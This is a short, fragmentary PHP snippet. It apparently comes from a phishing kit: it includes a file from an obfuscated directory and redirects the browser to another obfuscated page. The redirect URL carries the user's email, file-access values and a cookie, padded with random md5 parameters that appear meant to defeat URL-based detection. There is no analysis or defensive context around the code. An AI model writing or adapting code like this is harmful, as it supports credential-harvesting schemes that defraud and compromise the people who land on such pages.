...
include '__0c_9b_0a_/0___/b.php';
	...
	header("Location: __0c_9b_0a_/__1a__20__.php?8=$email&accessToFile=".$accessFiles."&fileAccess=".$fileAccess."&encryptedCookie=".$cookie."&u=".md5(rand())."&connecting=".md5(rand())."&phaseAccess=".md5(rand())."&p=".md5(rand()));
